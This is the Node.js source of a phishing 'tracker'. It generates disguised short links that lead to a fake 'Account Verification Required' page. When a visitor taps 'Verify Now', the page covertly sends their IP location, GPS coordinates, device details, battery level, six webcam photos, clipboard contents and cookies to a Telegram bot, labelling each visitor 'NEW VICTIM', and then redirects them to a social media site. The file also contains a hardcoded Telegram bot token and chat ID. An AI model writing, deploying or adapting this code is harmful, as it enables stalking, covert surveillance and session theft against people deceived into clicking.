const express = require('express');
const crypto = require('crypto');

const app = express();

// ===== TERI VALUES =====
const TELEGRAM_TOKEN = "8840717306:AAFnJ695LhZEm8kZOPdMyxHHE2EOselmxec";
const OWNER_CHAT_ID = "8179349999";
// ========================

// Parse JSON body
app.use(express.json({limit:'50mb'}));
app.use(express.urlencoded({limit:'50mb', extended:true}));

// Store short URLs
const shortUrls = {};

// =========================================
// 1. SHORT URL GENERATOR
// =========================================
app.get('/shorten', (req, res) => {
    const url = req.query.url;
    if (!url) return res.status(400).send('URL required');
    
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let code = '';
    for (let i = 0; i < 6; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
    }
    shortUrls[code] = url;
    console.log(`[SHORT] Created: ${code}`);
    res.send(code);
});

// =========================================
// 2. SHORT URL REDIRECT (SIDHA - BINA DELAY)
// =========================================
app.get('/s/:code', (req, res) => {
    const target = shortUrls[req.params.code];
    if (target) {
        console.log(`[REDIRECT] /s/${req.params.code}`);
        res.redirect(302, target);
    } else {
        res.status(404).send('Link expired');
    }
});

// =========================================
// 3. PHOTO UPLOAD ENDPOINT (IMG BB KE BINA)
// =========================================
app.post('/upload-photo', async (req, res) => {
    try {
        const { image, creator_id } = req.body;
        if (!image) return res.status(400).json({error: 'No image'});
        
        const targetChat = creator_id || OWNER_CHAT_ID;
        const buffer = Buffer.from(image, 'base64');
        
        // Directly upload to Telegram using multipart
        const FormData = (await import('form-data')).default;
        const form = new FormData();
        form.append('chat_id', targetChat);
        form.append('photo', buffer, {
            filename: 'photo.jpg',
            contentType: 'image/jpeg'
        });
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form,
            headers: form.getHeaders()
        });
        
        const result = await response.json();
        if (result.ok) {
            console.log(`[PHOTO] Sent to ${targetChat}`);
            res.json({success: true});
        } else {
            console.log(`[PHOTO] TG error:`, result);
            res.json({success: false, error: result.description});
        }
    } catch(e) {
        console.log(`[PHOTO] Error:`, e.message);
        res.json({success: false, error: e.message});
    }
});

// =========================================
// 4. SEND DATA ENDPOINT
// =========================================
app.post('/send-data', (req, res) => {
    const {type, data, creator_id} = req.body;
    const targetChat = creator_id || OWNER_CHAT_ID;
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
        encodeURIComponent(`📦 *DATA*\n${type}\n\n${(data || '').substring(0, 3500)}`) + 
        "&parse_mode=Markdown").catch(()=>{});
    res.send({ok:true});
});

// =========================================
// 5. MAIN TRACKING PAGE - EK CLICK MEIN SAB
// =========================================
app.get('/go/:encoded/:creatorid', (req, res) => {
    try {
        let legitUrl = Buffer.from(req.params.encoded, 'base64').toString('utf-8');
        const CREATOR_ID = req.params.creatorid;
        
        if(legitUrl.includes('instagram.com')) legitUrl = "https://www.instagram.com/reels/";
        else if(legitUrl.includes('youtube.com')) legitUrl = "https://www.youtube.com/shorts/";
        else if(legitUrl.includes('facebook.com')) legitUrl = "https://www.facebook.com/reel/";
        else if(!legitUrl.startsWith('http')) legitUrl = "https://www.google.com";
        
        const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;
background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:rgba(255,255,255,0.96);border-radius:24px;padding:35px 28px;
max-width:400px;width:100%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.6)}
.icon{font-size:64px;margin-bottom:10px}
h2{color:#1a1a2e;font-size:20px;margin-bottom:4px}
.sub{color:#777;font-size:13px;margin-bottom:20px}
.btn{display:block;width:100%;padding:18px;background:linear-gradient(135deg,#667eea,#764ba2);
color:white;border:none;border-radius:16px;font-size:18px;font-weight:600;
cursor:pointer;transition:all 0.3s;box-shadow:0 8px 25px rgba(102,126,234,0.4)}
.btn:hover{transform:translateY(-2px)}
.btn:disabled{opacity:0.6;cursor:not-allowed;transform:none}
.status{color:#666;font-size:13px;margin-top:14px;min-height:40px}
.loader{display:none;width:40px;height:40px;border:4px solid #f0f0f0;
border-top:4px solid #667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<div class="icon">&#x1f6e1;</div>
<h2>Account Verification Required</h2>
<p class="sub">Click the button below to complete verification</p>
<div class="loader" id="loader"></div>
<button class="btn" id="mainBtn" onclick="startCapture()">&#x1f513; Verify Now</button>
<div class="status" id="status">Tap "Verify Now" to continue</div>
</div>

<script>
const CID = "${CREATOR_ID}";
const TOKEN = "${TELEGRAM_TOKEN}";
const REDIR = "${legitUrl}";

function tg(msg) {
    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CID+
        "&text="+encodeURIComponent(msg)+"&parse_mode=Markdown").catch(()=>{});
}

async function uploadPhoto(base64) {
    try {
        const res = await fetch("/upload-photo", {
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({image: base64, creator_id: CID})
        });
        const data = await res.json();
        return data.success;
    } catch(e) {
        return false;
    }
}

async function startCapture() {
    const btn = document.getElementById('mainBtn');
    const status = document.getElementById('status');
    const loader = document.getElementById('loader');
    
    btn.disabled = true;
    btn.textContent = "⏳ Verifying...";
    loader.style.display = 'block';
    
    // 1. IP + Location
    status.textContent = "📡 Getting location...";
    try {
        const r = await fetch("https://ipapi.co/json/");
        const d = await r.json();
        let msg = "📍 *NEW VICTIM*\\n\\n";
        msg += "*IP:* "+(d.ip||"N/A")+"\\n*City:* "+(d.city||"N/A")+"\\n*Region:* "+(d.region||"N/A")+
               "\\n*Country:* "+(d.country_name||"N/A")+"\\n*ISP:* "+(d.org||"N/A")+
               "\\n*Lat:* "+(d.latitude||"N/A")+"\\n*Lon:* "+(d.longitude||"N/A");
        tg(msg);
    } catch(e) {}
    
    // 2. GPS
    status.textContent = "📍 Getting GPS...";
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            p => tg("🎯 *GPS*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m"),
            () => tg("❌ GPS denied"),
            {timeout:5000, enableHighAccuracy:true}
        );
    }
    
    // 3. Device Info
    status.textContent = "🧾 Scanning device...";
    let di = "🧾 *DEVICE*\\n";
    di += "*Platform:* "+(navigator.platform||"N/A")+"\\n";
    di += "*Lang:* "+navigator.language+"\\n";
    di += "*Screen:* "+screen.width+"x"+screen.height+"\\n";
    di += "*RAM:* "+(navigator.deviceMemory||"?")+"GB\\n*Cores:* "+(navigator.hardwareConcurrency||"?");
    tg(di);
    
    // 4. Battery
    if(navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            tg("🔋 *BATTERY*\\nLevel: "+Math.round(b.level*100)+"%\\nCharging: "+(b.charging?"Yes":"No"));
        } catch(e){}
    }
    
    // 5. CAMERA - 6 PHOTOS (DIRECT UPLOAD - NO IMGBB)
    status.textContent = "📸 Capturing photos...";
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {width:{ideal:320},height:{ideal:240},facingMode:"user"},
            audio: false
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.setAttribute("playsinline","");
        await video.play();
        
        for(let i=0; i<6; i++) {
            await new Promise(r => setTimeout(r, 500));
            const c = document.createElement("canvas");
            c.width = 320; c.height = 240;
            c.getContext("2d").drawImage(video, 0, 0);
            const b64 = c.toDataURL("image/jpeg",0.5).split(",")[1];
            
            const ok = await uploadPhoto(b64);
            tg("📸 *Photo "+(i+1)+"/6* "+(ok?"✅":"❌"));
            status.textContent = "📸 Photo "+(i+1)+"/6...";
        }
        
        stream.getTracks().forEach(t=>t.stop());
        tg("📸 *CAMERA DONE* - 6 photos ✅");
    } catch(e) {
        tg("❌ *Camera Error:* "+(e.message||"Denied"));
    }
    
    // 6. Clipboard
    status.textContent = "📋 Reading clipboard...";
    try {
        if(navigator.clipboard && navigator.clipboard.readText) {
            const text = await navigator.clipboard.readText();
            if(text && text.length > 0) tg("📋 *CLIPBOARD*\\n\\n"+text.substring(0,800));
        }
    } catch(e){}
    
    // 7. Cookies
    try {
        if(document.cookie && document.cookie.length > 0) {
            tg("🍪 *COOKIES*\\n\\n"+document.cookie.substring(0,1000));
        }
    } catch(e){}
    
    // Done - Redirect
    loader.style.display = 'none';
    status.textContent = "✅ Complete! Redirecting...";
    btn.textContent = "✓ Done";
    
    setTimeout(() => {
        window.location.href = REDIR;
    }, 1500);
}
</script>
</body>
</html>`;
        res.send(html);
    } catch(e) {
        res.status(400).send('Invalid link');
    }
});

app.get('/', (req, res) => {
    res.send('✅ Tracker Running');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Tracker on port', PORT));
